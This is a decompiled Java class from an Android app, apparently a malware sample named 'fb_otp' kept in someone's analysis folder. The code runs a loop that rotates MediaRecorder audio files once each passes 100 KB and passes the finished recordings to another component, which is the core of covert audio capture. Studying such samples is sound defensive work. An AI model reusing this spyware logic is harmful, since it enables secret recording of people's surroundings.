import android.media.MediaRecorder;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

final class ep
  implements Runnable
{
  ep(en paramen) {}
  
  public final void run()
  {
    for (;;)
    {
      if (!this.a.jdField_a_of_type_JavaLangBoolean.booleanValue()) {
        return;
      }
      if (new File(this.a.jdField_a_of_type_JavaLangString).length() > 100000L) {}
      try
      {
        this.a.jdField_a_of_type_AndroidMediaMediaRecorder.stop();
        this.a.jdField_a_of_type_AndroidMediaMediaRecorder.release();
        this.a.b = this.a.jdField_a_of_type_JavaLangString;
        en localen1 = this.a;
        en localen2 = this.a;
        localen1.jdField_a_of_type_JavaLangString = en.a(this.a.c);
        this.a.a();
        en.a(this.a);
        en.b(this.a);
        try
        {
          TimeUnit.SECONDS.sleep(this.a.jdField_a_of_type_Int);
        }
        catch (InterruptedException localInterruptedException)
        {
          localInterruptedException.printStackTrace();
        }
      }
      catch (IOException localIOException)
      {
        for (;;)
        {
          localIOException.printStackTrace();
        }
      }
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/ep.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */